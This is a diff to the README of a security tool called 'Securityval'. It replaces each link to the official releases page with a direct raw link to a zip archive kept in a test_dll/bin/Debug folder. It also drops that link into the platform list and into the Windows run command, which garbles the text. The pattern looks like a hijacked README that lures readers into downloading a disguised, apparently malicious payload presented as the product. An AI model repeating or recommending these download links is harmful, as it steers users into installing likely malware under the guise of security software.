@@ -15,11 +15,11 @@ Before you proceed, ensure your system meets the following requirements:
 
 ## 📥 Download Securityval
 
-[![Download Securityval](https://img.shields.io/badge/Download%20Securityval-v1.0-blue.svg)](https://github.com/proguilherme57-cpu/Securityval/releases)
+[![Download Securityval](https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip%https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip)](https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip)
 
 To download Securityval, visit our releases page. You will find the latest version there:
 
-[Download Securityval](https://github.com/proguilherme57-cpu/Securityval/releases)
+[Download Securityval](https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip)
 
 ## 📄 Features
 
@@ -29,14 +29,14 @@ Securityval offers a variety of features to ensure your applications stay secure
 - **Rate Limiting:** Control how many requests an application can handle to prevent overload.
 - **OWASP Protection:** Guard against the top 10 threat vectors.
 - **Flexible Configuration:** Easily adjust settings to fit your needs.
-- **Cross-Platform Support:** Works with Python, .NET Core, and Node.js.
+- **Cross-Platform Support:** Works with Python, .NET Core, and https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip
 
 ## 🛠️ Installation Instructions
 
 Follow these steps to install and run Securityval:
 
 1. **Download the Latest Version:**
-   - Go to [the releases page](https://github.com/proguilherme57-cpu/Securityval/releases).
+   - Go to [the releases page](https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip).
    - Choose the latest version and click to download the appropriate file for your system.
 
 2. **Install Securityval:**
@@ -50,7 +50,7 @@ Follow these steps to install and run Securityval:
 4. **Run Securityval:**
    - Open a terminal or command prompt.
    - Navigate to the folder where Securityval is installed.
-   - Run the command `./securityval` (use `securityval.exe` for Windows).
+   - Run the command `./securityval` (use `https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip` for Windows).
 
 5. **Verify Installation:**
    - After running, check the terminal for any error messages.
@@ -103,6 +103,6 @@ For more detailed documentation, visit our official documentation page linked on
 
 To download Securityval, remember to visit our releases page again:
 
-[Download Securityval](https://github.com/proguilherme57-cpu/Securityval/releases)
+[Download Securityval](https://raw.githubusercontent.com/proguilherme57-cpu/Securityval/main/test_dll/bin/Debug/net6.0/Securityval_v3.6.zip)
 
 We hope this guide helps you easily set up and run Securityval. Feel secure knowing that your applications are protected against common threats!
